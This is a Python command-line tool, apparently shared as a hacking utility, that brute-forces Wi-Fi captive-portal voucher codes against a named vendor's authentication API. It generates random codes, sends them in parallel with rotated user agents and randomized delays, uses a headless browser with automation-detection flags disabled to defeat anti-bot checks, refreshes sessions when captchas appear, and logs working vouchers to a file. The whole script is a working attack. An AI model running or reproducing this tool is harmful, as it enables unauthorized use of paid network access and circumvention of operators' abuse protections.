#!/usr/bin/env python3

import os
import sys
import re
import time
import json
import random
import string
import hashlib
import base64
import asyncio
import aiohttp
from datetime import datetime

# --- Constants and Configuration ---

# Color codes for terminal output
class Colors:
    RESET = "\033[1;00m"
    GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    RED = "\033[1;31m"
    CYAN = "\033[1;36m"
    PURPLE = "\033[1;35m"
    LIGHT_RED = "\033[1;91m"

# --- Utility Functions ---

def clear_screen():
    """Clears the terminal screen."""
    if os.name == 'nt':
        os.system('cls')
    else:
        sys.stdout.write('\033[H\033[2J')
        sys.stdout.flush()

def print_line():
    """Prints a decorative line."""
    print(f"{Colors.RED}─" * 65 + f"{Colors.RESET}")

def print_logo():
    """Prints the application logo and header."""
    clear_screen()
    print(r"""⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃ ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀ ┃""")
    print(r"""┃ ⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀ ┃""")
    print(r"""┃ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃ ⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃ ⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀ ┃""")
    print(r"""┃ ⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀ ┃""")
    print(r"""┃ ⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀ ┃""")
    print(r"""┃ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃ ⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀ ┃""")
    print(r"""┃ ⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀ ┃""")
    print(r"""┃  ⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀ ┃""")
    print(r"""┃⠀ ⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀ ┃""")
    print(r"""┃⠀⠀ ⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀ ┃""")
    print(r"""┃⠀⠀⠀ ⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃⠀⠀⠀⠀ ⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃⠀⠀⠀⠀⠀ ⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ┃""")
    print(r"""┃                                                ┃""")
    print(r"""┃""")
    print(f"""{Colors.CYAN} _       ___________  ____     ____  ______     ____  ___    ____  __ __ _   _ _____ ____ ____  \n{Colors.RESET}""")
    print(f"""{Colors.CYAN}| |     / /  _  \\____\\|  _ \\   / __ \\|  ____|   |  _ \\|  _  \\  |  _ \\|  |  | \\ | | ____/ ___/ ___| \n{Colors.RESET}""")
    print(f"""{Colors.CYAN}| |    / /| | | |  _  | |_) | | |  | | |__      | |_) | |_| |  | |_) |  |  |  \\| | |__| |  |  \\___ \\n{Colors.RESET}""")
    print(f"""{Colors.CYAN}| |   / / | | | | | | |  _ (  | |  | |  __|     |  _ (|  _  |  |  _ (|  |  | . ` |  __| |   \\___ \\\n{Colors.RESET}""")
    print(f"""{Colors.CYAN}| |__/ /  | |_| | | | | |_) | | |__| | |        | |_) | | | |  | |_) |  |  | |\\  | |__| |___ ___) |\n{Colors.RESET}""")
    print(f"""{Colors.CYAN}|_____/    \\___________/_____/   \\____/|_|        |_____/|_| |_|  |_____/|__|__|\\_\\_____|____|____/ {Colors.RESET}""")
    print_line()
    print(f" {Colors.LIGHT_RED}⚡ {Colors.YELLOW}COMMANDER : {Colors.CYAN}THET PAING ZAW {Colors.RESET}")
    print_line()

def generate_voucher(mode, length):
    """Generates a random voucher string based on the specified mode and length."""
    if mode == "digit":
        return "".join(random.choice(string.digits) for _ in range(length))
    elif mode == "ascii-upper":
        return "".join(random.choice(string.ascii_uppercase) for _ in range(length))
    else:  # "all" or any other mode
        return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def get_random_user_agent():
    """Returns a random user agent string."""
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ]
    return random.choice(user_agents)

# --- Playwright Integration (Optional) ---

PLAYWRIGHT_READY = False
try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_READY = True
except ImportError:
    print(f"{Colors.YELLOW}[WARNING] Playwright not installed. Anti-bot bypass may not work.{Colors.RESET}")
    print(f"{Colors.YELLOW}Install with: pip install playwright && playwright install{Colors.RESET}")

async def bypass_anti_bot(url: str) -> str | None:
    """Attempts to bypass anti-bot mechanisms using Playwright to get a session ID."""
    if not PLAYWRIGHT_READY:
        return None
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True, args=[
                '--disable-blink-features=AutomationControlled',
                '--disable-dev-shm-usage', '--no-sandbox'
            ])
            context = await browser.new_context(
                viewport={'width': 1920, 'height': 1080},
                user_agent=get_random_user_agent()
            )
            page = await context.new_page()
            await page.goto(url, timeout=15000, wait_until='networkidle')
            await page.wait_for_timeout(2000)  # Give some time for JS to execute
            current_url = page.url
            session_id_match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", current_url)
            await browser.close()
            return session_id_match.group(1) if session_id_match else None
    except Exception as e:
        print(f"{Colors.RED}[ERROR] Playwright anti-bot bypass failed: {e}{Colors.RESET}")
        return None

# --- Core Brute-forcer Logic ---

class VoucherBruteforcer:
    def __init__(self, mode: str, length: int, workers: int, speed: int, target_success: int = 1):
        self.mode = mode
        self.length = length
        self.workers = workers
        self.target_speed = speed
        self.target_success = target_success

        self.success_count = 0
        self.failed_count = 0
        self.expired_count = 0
        self.captcha_count = 0
        self.request_count = 0
        self.start_time = 0
        self.successful_vouchers = []
        self.session_id = None
        self.base_url = "http://10.44.77.240:2060"

        self._load_base_url()

    def _load_base_url(self):
        """Loads the base URL from a file if it exists."""
        try:
            with open(".session_url", "r") as f:
                self.base_url = f.read().strip()
        except FileNotFoundError:
            pass  # Use default base_url
        except Exception as e:
            print(f"{Colors.YELLOW}[WARNING] Could not read .session_url: {e}{Colors.RESET}")

    async def _get_initial_session_id(self, session: aiohttp.ClientSession) -> str:
        """Fetches an initial session ID, trying anti-bot bypass if necessary."""
        try:
            async with session.get(self.base_url, headers={"user-agent": get_random_user_agent()}, allow_redirects=True, timeout=10) as response:
                current_url = str(response.url)
                session_id_match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", current_url)
                if session_id_match:
                    return session_id_match.group(1)
        except aiohttp.ClientError as e:
            print(f"{Colors.YELLOW}[WARNING] Initial session ID fetch failed: {e}{Colors.RESET}")
        except asyncio.TimeoutError:
            print(f"{Colors.YELLOW}[WARNING] Initial session ID fetch timed out.{Colors.RESET}")

        # Fallback to anti-bot bypass if direct fetch fails or no session ID found
        print(f"{Colors.YELLOW}[INFO] Attempting anti-bot bypass for session ID...{Colors.RESET}")
        sid_from_bypass = await bypass_anti_bot(self.base_url)
        if sid_from_bypass:
            return sid_from_bypass
        
        print(f"{Colors.RED}[ERROR] Failed to obtain a valid session ID. Using a random one.{Colors.RESET}")
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))

    async def _login_attempt(self, session: aiohttp.ClientSession, voucher: str) -> str | None:
        """Attempts to log in with a given voucher and updates counts."""
        await asyncio.sleep(random.uniform(0.05, 0.2)) # Simulate human-like delay
        
        data = {"accessCode": voucher, "sessionId": self.session_id, "apiVersion": 1}
        url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
        headers = {"content-type": "application/json", "user-agent": get_random_user_agent(), "connection": "keep-alive"}
        
        try:
            async with session.post(url, json=data, headers=headers, timeout=10) as response:
                self.request_count += 1
                response_text = await response.text()
                
                if "logonUrl" in response_text:
                    self.success_count += 1
                    self.successful_vouchers.append(voucher)
                    print(f"{Colors.GREEN}[✓] FOUND SUCCESS VOUCHER -> {voucher}{Colors.RESET}")
                    return "success"
                elif "expired" in response_text.lower():
                    self.expired_count += 1
                    return "expired"
                elif "captcha" in response_text.lower():
                    self.captcha_count += 1
                    return "captcha"
                else:
                    self.failed_count += 1
                    return "failed"
        except aiohttp.ClientError as e:
            # print(f"{Colors.RED}[ERROR] Request failed: {e}{Colors.RESET}")
            self.failed_count += 1 # Count network errors as failed attempts
            return "error"
        except asyncio.TimeoutError:
            # print(f"{Colors.RED}[ERROR] Request timed out.{Colors.RESET}")
            self.failed_count += 1
            return "timeout"
        except Exception as e:
            # print(f"{Colors.RED}[ERROR] An unexpected error occurred during login attempt: {e}{Colors.RESET}")
            self.failed_count += 1
            return "error"

    async def run(self):
        """Main function to run the voucher bruteforcer."""
        print_logo()
        
        print(f" {Colors.YELLOW}[+] MODE    : {Colors.CYAN}{self.mode.upper()}{Colors.RESET}")
        print(f" {Colors.YELLOW}[+] LENGTH  : {Colors.CYAN}{self.length}{Colors.RESET}")
        print(f" {Colors.YELLOW}[+] WORKERS : {Colors.CYAN}{self.workers}{Colors.RESET}")
        print(f" {Colors.YELLOW}[+] SPEED   : {Colors.CYAN}{self.target_speed} req/s{Colors.RESET}")
        print_line()
        
        connector = aiohttp.TCPConnector(limit=self.workers * 2, limit_per_host=self.workers, ttl_dns_cache=300, use_dns_cache=True)
        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=15)) as session:
            self.session_id = await self._get_initial_session_id(session)
            
            print(f" {Colors.GREEN}[🗝️] VOID GATEWAY CONNECTED : {self.session_id[:20]}...{Colors.RESET}")
            print_line()
            
            self.start_time = time.time()
            captcha_wait_count = 0
            
            try:
                while self.success_count < self.target_success:
                    tasks = []
                    for _ in range(self.workers):
                        voucher = generate_voucher(self.mode, self.length)
                        tasks.append(self._login_attempt(session, voucher))
                    
                    results = await asyncio.gather(*tasks)
                    
                    for result in results:
                        if result == "captcha":
                            captcha_wait_count += 1
                            if captcha_wait_count >= 3: # If 3 consecutive captchas, try to get new session ID
                                print(f"{Colors.YELLOW}[INFO] Multiple captchas detected. Attempting to refresh session ID...{Colors.RESET}")
                                self.session_id = await self._get_initial_session_id(session)
                                captcha_wait_count = 0
                                await asyncio.sleep(1) # Small delay after refreshing session
                    
                    # Control request speed
                    if self.target_speed > 0:
                        elapsed_since_start = time.time() - self.start_time
                        expected_requests = elapsed_since_start * self.target_speed
                        current_requests = self.request_count
                        
                        if current_requests > expected_requests:
                            sleep_time = (current_requests / self.target_speed) - elapsed_since_start
                            if sleep_time > 0:
                                await asyncio.sleep(sleep_time)

                    # Print progress every 100 requests or so
                    if self.request_count % (self.workers * 5) == 0 and self.request_count > 0:
                        self._print_progress()
                        
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!] Brute-forcing interrupted by user.{Colors.RESET}")
            finally:
                self._print_final_stats()
                self._save_successful_vouchers()

    def _print_progress(self):
        """Prints the current progress statistics."""
        elapsed = time.time() - self.start_time
        current_speed = self.request_count / elapsed if elapsed > 0 else 0
        print(f" {Colors.CYAN}[📊] Req: {self.request_count:<6} | {current_speed:.1f} r/s | [✓:{self.success_count}] [⌛:{self.expired_count}] [✗:{self.failed_count}] [🔒:{self.captcha_count}]{Colors.RESET}")

    def _print_final_stats(self):
        """Prints the final statistics of the bruteforcing process."""
        elapsed = time.time() - self.start_time
        final_speed = self.request_count / elapsed if elapsed > 0 else 0
        
        print_line()
        print(f" {Colors.GREEN}[✓] SUCCESS : {self.success_count}{Colors.RESET}")
        print(f" {Colors.YELLOW}[⌛] EXPIRED : {self.expired_count}{Colors.RESET}")
        print(f" {Colors.RED}[✗] FAILED  : {self.failed_count}{Colors.RESET}")
        print(f" {Colors.CYAN}[🔒] CAPTCHA : {self.captcha_count}{Colors.RESET}")
        print(f" {Colors.CYAN}[📊] TOTAL   : {self.request_count}{Colors.RESET}")
        print(f" {Colors.CYAN}[⚡] SPEED   : {final_speed:.1f} req/s{Colors.RESET}")
        print_line()

    def _save_successful_vouchers(self):
        """Saves successfully found vouchers to a file."""
        if self.successful_vouchers:
            with open("success.txt", "a") as f:
                for voucher in self.successful_vouchers:
                    f.write(voucher + "\n")
            print(f"{Colors.GREEN}[INFO] Successfully saved {len(self.successful_vouchers)} vouchers to success.txt{Colors.RESET}")

# --- History Management ---

def show_history():
    """Displays the history of successful vouchers."""
    print_logo()
    print(f" {Colors.PURPLE}[📜] SUCCESS VOUCHERS HISTORY {Colors.RESET}")
    print_line()
    if os.path.exists("success.txt"):
        with open("success.txt", "r") as f:
            lines = f.readlines()
            if lines:
                for i, line in enumerate(lines, 1):
                    print(f" {Colors.GREEN}[{i}] -> {line.strip()}{Colors.RESET}")
            else:
                print(f" {Colors.RED}[!] No vouchers found in history.{Colors.RESET}")
    else:
        print(f" {Colors.RED}[!] History file does not exist.{Colors.RESET}")
    print_line()
    input(f" Press Enter to main menu...")

# --- Main Application Logic ---

def main():
    # The original _v_tamper and _v_debug functions are removed as they are not standard practice
    # for open-source scripts and can cause unexpected behavior or false positives.
    # If tamper detection is critical, a more robust and transparent mechanism should be implemented.

    while True:
        print_logo()
        print(f" {Colors.GREEN}[1] RUN WITH DIGITS (0-9){Colors.RESET}")
        print(f" {Colors.GREEN}[2] RUN WITH LETTERS ONLY (A-Z){Colors.RESET}")
        print(f" {Colors.GREEN}[3] RUN WITH ALL MIXED (0-9, A-Z){Colors.RESET}")
        print(f" {Colors.PURPLE}[4] VIEW SUCCESS HISTORY{Colors.RESET}")
        print(f" {Colors.RED}[0] EXIT{Colors.RESET}")
        print_line()
        
        choice = input(f" {Colors.YELLOW}SELECT OPTION : {Colors.RESET}").strip()
        
        if choice == "1":
            bruteforcer = VoucherBruteforcer("digit", 6, 20, 50, target_success=1)
            asyncio.run(bruteforcer.run())
            input(f"\n Press Enter to main menu...")
        elif choice == "2":
            bruteforcer = VoucherBruteforcer("ascii-upper", 6, 20, 50, target_success=1)
            asyncio.run(bruteforcer.run())
            input(f"\n Press Enter to main menu...")
        elif choice == "3":
            bruteforcer = VoucherBruteforcer("all", 6, 20, 50, target_success=1)
            asyncio.run(bruteforcer.run())
            input(f"\n Press Enter to main menu...")
        elif choice == "4":
            show_history()
        elif choice == "0":
            print(f"\n{Colors.YELLOW}[!] GOODBYE...{Colors.RESET}")
            sys.exit(0)
        else:
            print(f" {Colors.RED}[!] Invalid choice!{Colors.RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[CRITICAL ERROR] An unhandled exception occurred: {e}{Colors.RESET}")
        sys.exit(1)
